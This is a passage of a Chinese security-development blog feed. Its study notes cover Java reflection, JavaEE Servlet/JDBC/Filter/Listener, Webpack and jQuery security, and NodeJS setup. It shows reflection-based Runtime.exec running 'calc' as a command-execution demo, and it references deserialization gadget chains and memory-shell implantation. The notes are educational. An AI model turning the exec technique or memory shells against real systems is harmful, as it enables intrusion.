class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Field field=aClass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.set(u,<span class="number">30</span>);</span><br><span class="line">        Object a=field.get(u);</span><br><span class="line">        System.out.println(a);</span><br></pre></td></tr></table></figure><h2 id="Java-反射-Method成员方法类获取"><a href="#Java-反射-Method成员方法类获取" class="headerlink" title="Java-反射-Method成员方法类获取"></a>Java-反射-Method成员方法类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有公共成员方法对象的数组，包括继承的</span></span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">            System.out.println(me);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有成员方法对象的数组，不包括继承的</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">            System.out.println(me);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个公共成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;UserInfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行方法invoke</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;UserInfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">//私有需要开启临时</span></span><br><span class="line">        methods.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods.invoke(u,<span class="string">&quot;xiaodi&quot;</span>,<span class="number">18</span>,<span class="string">&quot;man&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Java-反射-Constructor构造方法类获取"><a href="#Java-反射-Constructor构造方法类获取" class="headerlink" title="Java-反射-Constructor构造方法类获取"></a>Java-反射-Constructor构造方法类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//返回所有公共构造方法对象的数组</span></span><br><span class="line">        Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con:constructors)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有构造方法对象的数组</span></span><br><span class="line">        Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con:constructors)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个公共构造方法对象</span></span><br><span class="line">        Constructor con1=aClass.getConstructor();</span><br><span class="line">        Constructor con1=aClass.getConstructor(String.class);</span><br><span class="line">        System.out.println(con1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个构造方法对象</span></span><br><span class="line">        Constructor con2=aClass.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">Constructor con2=aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class, String.class);</span><br><span class="line">        System.out.println(con2);</span><br><span class="line"></span><br><span class="line">        Constructor con2=aClass.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">        con2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        User uu=(User) con2.newInstance(<span class="string">&quot;xiaodi&quot;</span>,<span class="number">30</span>,<span class="string">&quot;man&quot;</span>);</span><br><span class="line">        System.out.println(uu);</span><br></pre></td></tr></table></figure><h2 id="Java-反射-不安全命令执行-反序列化链构造"><a href="#Java-反射-不安全命令执行-反序列化链构造" class="headerlink" title="Java-反射-不安全命令执行&amp;反序列化链构造"></a>Java-反射-不安全命令执行&amp;反序列化链构造</h2><ul><li><p>1、反射实现-命令执行  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-原型：</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">-反射：</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method[] methods = aClass.getMethods();</span><br><span class="line"><span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">    System.out.println(me);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(aClass);</span><br><span class="line">exec.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>2、不安全的反射对象<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，<br>可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查<br>参考分析：<a href="https://zhuanlan.zhihu.com/p/165273855">https://zhuanlan.zhihu.com/p/165273855</a><br>利用结合：<a href="https://xz.aliyun.com/t/7031%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">https://xz.aliyun.com/t/7031（反序列化利用链）</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>33安全开发-JavaEE应用</title>
      <link href="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>29、JavaEE-JDBC-SQL预编译</li><li>30、JavaEE-HTTP-Filter过滤器</li><li>31、JavaEE-对象域-Listen监听器</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter1.png"><br> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter2.png"><br> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter3.png"></p><h2 id="JavaEE-预编译-SQL"><a href="#JavaEE-预编译-SQL" class="headerlink" title="JavaEE-预编译-SQL"></a>JavaEE-预编译-SQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">预编译SQL语句并执行,预防SQL注入问题 </span><br><span class="line">String safesql=&quot;select * from news where id=?&quot;; </span><br><span class="line">PreparedStatement preparedStatement=connection.prepareStatement();</span><br><span class="line">preparedStatement.setString(1,s);</span><br><span class="line">ResultSet resultSet=preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="JavaEE-过滤器-Filter"><a href="#JavaEE-过滤器-Filter" class="headerlink" title="JavaEE-过滤器-Filter"></a>JavaEE-过滤器-Filter</h2><p>(和安全相关的技术：内存马，权限控制)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。  </p><ul><li>1、创建过滤器  </li><li>2、过滤器内置方法<br>init  doFilter destroy  </li><li>3、过滤器触发流程  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(&quot;/xss&quot;)</span></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;xssFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.example.filter.xssFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;xssFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/xss&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure></li><li>4、过滤器安全场景<br>Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等<br>内存马参考：<a href="https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw">https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw</a></li></ul><h2 id="JavaEE-监听器-Listen"><a href="#JavaEE-监听器-Listen" class="headerlink" title="JavaEE-监听器-Listen"></a>JavaEE-监听器-Listen</h2><p>参考：<a href="https://blog.csdn.net/qq_52797170/article/details/124023760">https://blog.csdn.net/qq_52797170/article/details/124023760</a>  </p><ul><li>监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件</li><li>监听域对象的属性发生修改的事件</li><li>监听在事件发生前、发生后做一些必要的处理<br>1、创建监听器<br>2、监听器内置方法<br>3、监听器触发流程  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    .......</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>4、监听器安全场景<br>代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32安全开发-JavaEE应用</title>
      <link href="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>27、JavaEE-HTTP-Servlet技术  </li><li>28、JavaEE-数据库-JDBC&amp;Mybatis</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/servlet.png"></p><h2 id="JavaEE-HTTP-Servlet-路由-周期"><a href="#JavaEE-HTTP-Servlet-路由-周期" class="headerlink" title="JavaEE-HTTP-Servlet&amp;路由&amp;周期"></a>JavaEE-HTTP-Servlet&amp;路由&amp;周期</h2><p>参考：<a href="https://blog.csdn.net/qq_52173163/article/details/121110753">https://blog.csdn.net/qq_52173163/article/details/121110753</a>  </p><ul><li><p>1、解释<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。  </p></li><li><p>2、创建和使用Servlet<br>-创建一个类继承HttpServlet<br>-web.xml配置Servlet路由<br>-WebServlet配置Servlet路由<br>-写入内置方法(init service destroy doget dopost)  </p></li><li><p>3、Servlet生命周期<br>见图  </p></li><li><p>4、处理接受和回显  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest       — ServletRequest的子接口  </span><br><span class="line">getParameter(name)       — String 通过name获得值  </span><br><span class="line">getParameterValues       — String[ ] 通过name获得多值  </span><br><span class="line">  </span><br><span class="line">HttpServletResponse      — ServletResponse的子接口   </span><br><span class="line">setCharacterEncoding()   — 设置编码格式  </span><br><span class="line">setContentType()         — 设置解析语言  </span><br><span class="line">getWriter()              — 获得一个PrintWriter字符输出流输出数据  </span><br><span class="line">PrintWriter              — 接受符合类型数据  </span><br></pre></td></tr></table></figure></li></ul><h2 id="JavaEE-数据库-JDBC-Mybatis-库"><a href="#JavaEE-数据库-JDBC-Mybatis-库" class="headerlink" title="JavaEE-数据库-JDBC&amp;Mybatis&amp;库"></a>JavaEE-数据库-JDBC&amp;Mybatis&amp;库</h2><p>(java和数据库连接，三种方式，自带官方库jdbc、第三方 hibernate和mybatis)  </p><ul><li><p>原生态数据库开发：JDBC<br>参考：<a href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！  </p></li><li><p>1、下载jar<br><a href="https://mvnrepository.com/">https://mvnrepository.com/</a>  </p></li><li><p>2、引用封装jar<br>创建lib目录，复制导入后，添加为库  </p></li><li><p>3、注册数据库驱动  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  </span><br></pre></td></tr></table></figure></li><li><p>4、建立数据库连接  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;jdbc:mysql://localhost:3306/demo01&quot;</span>;</span><br><span class="line">Connection connection=DriverManager.getConnection(url,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>5、创建Statement执行SQL  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Statement statement= connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br></pre></td></tr></table></figure></li><li><p>6、结果ResultSet进行提取  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">page_title</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;page_title&quot;</span>);</span><br><span class="line">    .......</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></li><li><p>7、安全修复SQL注入：预编译<br>原理：提前编译好执行逻辑，你注入的语句不会改变原有逻辑！  </p></li><li><p>8、框架数据库开发：Mybatis<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mybatis是一款优秀的持久层框架,避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集的过程，减少了代码的冗余，减少程序员的操作。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31安全开发-webpack</title>
      <link href="/2023/10/13/31%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-webpack/"/>
      <url>/2023/10/13/31%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-webpack/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>25、三方库-JQuery-使用&amp;安全</li><li>26、打包器-WebPack-使用&amp;安全</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>内容筹备中……</li></ul><h2 id="打包器-WebPack-使用-安全"><a href="#打包器-WebPack-使用-安全" class="headerlink" title="打包器-WebPack-使用&amp;安全"></a>打包器-WebPack-使用&amp;安全</h2><p>参考：<a href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Webpack是一个模块打包器。在Webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。  </p><h3 id="五个核心概念"><a href="#五个核心概念" class="headerlink" title="五个核心概念:"></a>五个核心概念:</h3><ol><li>【入口(entry)】：指示webpack应该使用哪个模块，来作为构建内部依赖图开始。  </li><li>【输出(output)】：在哪里输出文件，以及如何命名这些文件。  </li><li>【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。  </li><li>【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。  </li><li>【模式(mode)】：有生产模式production和开发模式development。</li></ol><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>1、创建需打包文件<br>2、安装webpack库<br>3、创建webpack配置文件<br>4、运行webpack打包命令  </p><h3 id="安全："><a href="#安全：" class="headerlink" title="安全："></a>安全：</h3><p>1、WebPack源码泄漏-模式选择<br>2、模糊提取安全检查-PacketFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>原生态JS：前端语言直接浏览器显示源代码<br>NodeJS：服务段语言浏览器不显示源代码<br>WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue）  </p><h2 id="第三方库-JQuery-使用-安全"><a href="#第三方库-JQuery-使用-安全" class="headerlink" title="第三方库-JQuery-使用&amp;安全"></a>第三方库-JQuery-使用&amp;安全</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。  </p><p>1、使用：<br>引用路径：<a href="https://www.jq22.com/jquery-info122">https://www.jq22.com/jquery-info122</a><br>2、安全：<br>检测：<a href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a><br>测试：CVE-2020-11022&#x2F;CVE-2020-11023<br>参考：<a href="https://blog.csdn.net/weixin_44309905/article/details/120902867">https://blog.csdn.net/weixin_44309905/article/details/120902867</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30安全开发-NodeJS</title>
      <link href="/2023/10/11/30%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-NodeJS/"/>
      <url>/2023/10/11/30%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-NodeJS/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>22、NodeJS-开发环境&amp;功能实现</li><li>23、NodeJS-安全漏洞&amp;案例分析</li><li>24、NodeJS-开发指南&amp;特有漏洞</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>内容筹备中……</li></ul><h2 id="环境搭建-NodeJS-解析安装-库安装"><a href="#环境搭建-NodeJS-解析安装-库安装" class="headerlink" title="环境搭建-NodeJS-解析安装&amp;库安装"></a>环境搭建-NodeJS-解析安装&amp;库安装</h2><h3 id="1、文档参考："><a href="#1、文档参考：" class="headerlink" title="1、文档参考："></a>1、文档参考：</h3><p><a href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a>  </p><h3 id="2、Nodejs安装"><a href="#2、Nodejs安装" class="headerlink" title="2、Nodejs安装"></a>2、Nodejs安装</h3><p><a href="https://nodejs.org/en">https://nodejs.org/en</a>  </p><h3 id="3、三方库安装"><a href="#3、三方库安装" class="headerlink" title="3、三方库安装"></a>3、三方库安装</h3><ul><li><p>express<br>Express是一个简洁而灵活的node.js Web应用框架  </p></li><li><p>body-parser<br>node.js中间件，用于处理 JSON, Raw, Text和URL编码的数据。  </p></li><li><p>cookie-parser<br>这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。  